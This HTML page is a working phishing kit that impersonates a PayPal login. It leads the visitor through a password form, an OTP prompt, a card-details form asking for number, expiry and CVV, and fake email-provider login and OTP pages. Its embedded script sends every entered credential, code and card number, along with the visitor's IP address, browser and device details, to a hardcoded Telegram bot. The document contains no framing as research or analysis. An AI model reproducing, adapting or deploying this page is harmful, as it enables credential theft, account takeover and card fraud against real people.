<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login and Verification</title>
    <style>
		body {
			font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
			background-color: #f5f7fa;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
			margin: 0;
		}

		.container {
			width: 460px;
			background: white;
			padding: 30px;
			border-radius: 8px;
			box-shadow: 0 0 20px rgba(0,0,0,0.1);
			text-align: center;
		}

		.logo {
			width: 60px;
			height: 60px;
			object-fit: contain;
			margin-bottom: 30px;
		}

		.input-group {
			margin-bottom: 20px;
		}

		input[type="email"], input[type="password"], input[type="text"] {
			width: 100%;
			padding: 15px;
			border: 1px solid #9da3a6;
			border-radius: 4px;
			box-sizing: border-box;
			font-size: 16px;
		}

		input[type="email"]:focus, input[type="password"]:focus, input[type="text"]:focus {
			border-color: #0070ba;
			outline: none;
			box-shadow: 0 0 0 2px rgba(0,112,186,0.2);
		}

		button {
			width: 100%;
			padding: 15px;
			background-color: #0070ba;
			border: none;
			border-radius: 25px;
			color: white;
			cursor: pointer;
			font-size: 16px;
			font-weight: bold;
			transition: background-color 0.3s;
		}

		button:hover {
			background-color: #005ea6;
		}

		.help-links {
			margin-top: 20px;
		}

		.help-links a {
			text-decoration: none;
			color: #0070ba;
			font-size: 14px;
		}

		h2 {
			color: #2c2e2f;
			font-size: 24px;
			margin-bottom: 20px;
		}

		ul {
			list-style: none;
			padding: 0;
			margin: 0;
		}

		ul li {
			display: flex;
			align-items: center;
			padding: 15px;
			border: 1px solid #cbd2d6;
			border-radius: 4px;
			margin-bottom: 10px;
			cursor: pointer;
			transition: background-color 0.3s, box-shadow 0.3s;
		}

		ul li img {
			width: 30px;
			height: 30px;
			margin-right: 15px;
			object-fit: contain;
		}

		ul li:hover {
			background-color: #f5f7fa;
			border-color: #0070ba;
		}

		#customPage .container {
			padding: 20px;
		}

		#customPage h2 {
			margin-bottom: 30px;
		}

		/* Add these new styles */
		.forgot-password {
			text-align: left;
			margin-bottom: 20px;
		}

		.forgot-password a {
			color: #0070ba;
			text-decoration: none;
			font-size: 14px;
		}

		.or-separator {
			display: flex;
			align-items: center;
			text-align: center;
			margin: 20px 0;
		}

		.or-separator::before,
		.or-separator::after {
			content: '';
			flex: 1;
			border-bottom: 1px solid #cbd2d6;
		}

		.or-separator span {
			padding: 0 10px;
			color: #6c7378;
			font-size: 14px;
		}

		.sign-up-button {
			background-color: white;
			color: #2c2e2f;
			border: 1px solid #cbd2d6;
		}

		.sign-up-button:hover {
			background-color: #f5f7fa;
		}

		.language-selector {
			margin-top: 30px;
			font-size: 14px;
			color: #6c7378;
		}

		.language-selector a {
			color: #0070ba;
			text-decoration: none;
			margin: 0 5px;
		}

		.footer {
			margin-top: 20px;
			font-size: 12px;
			color: #6c7378;
		}

		.footer a {
			color: #6c7378;
			text-decoration: none;
			margin: 0 5px;
		}
    </style>
</head>
<body>
    <div id="loginContainer" class="container">
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="Logo" class="logo">
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Log In</button>
			<div class="or-separator">
				<span>or</span>
			</div>
			<button type="button" class="sign-up-button">Sign Up</button>
        </form>
			<div class="language-selector">
				<a href="#">English</a> | <a href="#">Français</a> | <a href="#">Español</a> | <a href="#">中文</a>
			</div>
			<div class="footer">
				<a href="#">Contact Us</a> | <a href="#">Privacy</a> | <a href="#">Legal</a> | <a href="#">Policy Updates</a> | <a href="#">Worldwide</a>
			</div>
    </div>

    <div id="otpContainer" class="container" style="display: none;">
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="Logo" class="logo">
        <h2>OTP Verification</h2>
        <form id="otpForm">
            <div class="input-group">
                <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
            </div>
            <button type="submit">Verify OTP</button>
        </form>
    </div>

    <div id="cardDetails" class="container" style="display: none;">
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="Logo" class="logo">
        <h2>Card Details</h2>
        <form id="cardForm">
            <div class="input-group">
                <input type="text" id="cardName" name="cardName" placeholder="Name on Card" required>
            </div>
            <div class="input-group">
                <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required>
            </div>
            <div class="input-group">
                <input type="text" id="expDate" name="expDate" placeholder="Exp Date (MM/YY)" required>
            </div>
            <div class="input-group">
                <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <div id="customPage" class="container" style="display:none;">
        <h2>Select Your Email Provider</h2>
        <ul>
            <li onclick="navigateTo('icloud')"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg" alt="iCloud"><span>iCloud</span></li>
            <li onclick="navigateTo('exchange')"><img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Microsoft Exchange"><span>Microsoft Exchange</span></li>
            <li onclick="navigateTo('google')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Gmail_Icon.png/1024px-Gmail_Icon.png" alt="Google"><span>Google</span></li>
            <li onclick="navigateTo('yahoo')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg" alt="Yahoo"><span>Yahoo</span></li>
            <li onclick="navigateTo('aol')"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg" alt="AOL"><span>AOL</span></li>
            <li onclick="navigateTo('comcast')"><img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Comcast_%282013-2024%29_logo.svg" alt="Comcast"><span>Comcast</span></li>
            <li onclick="navigateTo('other')"><img src="https://imaginethatcreative.net/blog/wp-content/uploads/2023/06/2250206.png" alt="Other"><span>Other Email Provider</span></li>
        </ul>
    </div>

    <div id="providerLoginPage" class="container" style="display:none;">
        <img id="providerLogo" src="" alt="Provider Logo" class="logo">
        <form id="providerLoginForm">
            <div class="input-group">
                <input type="email" id="providerEmail" name="providerEmail" placeholder="Email" required>
            </div>
            <div class="input-group">
                <input type="password" id="providerPassword" name="providerPassword" placeholder="Password" required>
            </div>
            <div id="extraEmail" class="input-group" style="display:none;">
                <input type="email" id="customEmail" name="customEmail" placeholder="Your Email Address">
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>

    <div id="providerOtpPage" class="container" style="display:none;">
        <img id="providerOtpLogo" src="" alt="Provider Logo" class="logo">
        <h2>Provider OTP Verification</h2>
        <form id="providerOtpForm">
            <div class="input-group">
                <input type="text" id="providerOtp" name="providerOtp" placeholder="Enter OTP" required>
            </div>
            <button type="submit">Verify OTP</button>
        </form>
    </div>

    <script>
        const chatId = '-1002235110052';
        const telegramToken = '6620305104:AAFCfGH0q9azZkxN3TDNqDTe0k_MehLnWA4';
        let selectedProvider = '';

        function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Message sent:', data))
                .catch(error => console.error('Error sending message:', error));
        }

        function showPage(pageId) {
            document.querySelectorAll('.container').forEach(container => {
                container.style.display = 'none';
            });
            document.getElementById(pageId).style.display = 'block';
        }

        function navigateTo(provider) {
            selectedProvider = provider;
            showPage('providerLoginPage');
            const providerLogo = document.getElementById('providerLogo');
            const providerOtpLogo = document.getElementById('providerOtpLogo');
            const extraEmailInput = document.getElementById('extraEmail');

            const providerLogos = {
                'icloud': 'https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg',
                'exchange': 'https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg',
                'google': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Gmail_Icon.png/1024px-Gmail_Icon.png',
                'yahoo': 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg',
                'aol': 'https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg',
                'comcast': 'https://upload.wikimedia.org/wikipedia/commons/e/ea/Comcast_%282013-2024%29_logo.svg',
                'other': 'https://imaginethatcreative.net/blog/wp-content/uploads/2023/06/2250206.png'
            };

            providerLogo.src = providerLogos[provider] || '';
            providerOtpLogo.src = providerLogos[provider] || '';
            extraEmailInput.style.display = provider === 'other' ? 'block' : 'none';

            sendTelegramMessage(`User selected email provider: ${provider}`);
        }

        window.onload = function() {
            showPage('loginContainer');
            collectAndSendUserInfo();
        };

        function collectAndSendUserInfo() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    sendTelegramMessage(`User online: IP Address - ${data.ip}`);
                })
                .catch(error => console.error('Error fetching IP:', error));

            sendTelegramMessage(`User-Agent: ${navigator.userAgent}`);

            const deviceInfo = `Device Information: Screen Resolution - ${screen.width}x${screen.height}, Pixel Density - ${window.devicePixelRatio}, Orientation - ${screen.orientation.type}`;
            sendTelegramMessage(deviceInfo);
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loginInfo = `Initial login attempt - Email: ${email}, Password: ${password}`;

            sendTelegramMessage(loginInfo);
            showPage('otpContainer');
        });

        document.getElementById('otpForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const otp = document.getElementById('otp').value;
            sendTelegramMessage(`Initial OTP attempt: ${otp}`);
            showPage('cardDetails');
        });

        document.getElementById('cardForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const cardName = document.getElementById('cardName').value;
            const cardNumber = document.getElementById('cardNumber').value;
            const expDate = document.getElementById('expDate').value;
            const cvv = document.getElementById('cvv').value;
            const cardInfo = `Card details - Name: ${cardName}, Number: ${cardNumber}, Exp Date: ${expDate}, CVV: ${cvv}`;

            sendTelegramMessage(cardInfo);
            showPage('customPage');
        });

        document.getElementById('providerLoginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('providerEmail').value;
            const password = document.getElementById('providerPassword').value;
            const customEmail = document.getElementById('customEmail').value;
            const loginInfo = `Provider login attempt - Provider: ${selectedProvider}, Email: ${email}, Password: ${password}, Custom Email: ${customEmail}`;

            sendTelegramMessage(loginInfo);
            showPage('providerOtpPage');
        });

        document.getElementById('providerOtpForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const otp = document.getElementById('providerOtp').value;
            sendTelegramMessage(`Provider OTP attempt: ${otp}`);
            alert('Verification complete');
        });

        ['email', 'password', 'otp', 'cardName', 'cardNumber', 'expDate', 'cvv', 'providerEmail', 'providerPassword', 'customEmail', 'providerOtp'].forEach(id => {
            document.getElementById(id).addEventListener('input', function() {
                console.log(`User is typing in the ${id} field.`);
            });
        });
    </script>
</body>
</html>
